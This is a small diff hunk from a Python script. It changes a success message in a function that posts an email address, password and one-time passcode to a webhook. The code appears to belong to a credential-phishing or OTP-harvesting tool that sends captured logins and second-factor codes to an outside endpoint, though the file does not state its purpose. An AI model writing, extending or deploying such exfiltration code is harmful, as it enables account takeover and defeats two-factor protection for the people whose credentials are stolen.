@@ -107,7 +107,7 @@ def send_otp_webhook(email, password, otp_code):
     response = requests.post(url, json=data)
 
     if response.status_code == 204:
-        print("Webhook sent successfully!")
+        print("OTP Webhook sent successfully!")
     else:
         print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")
 
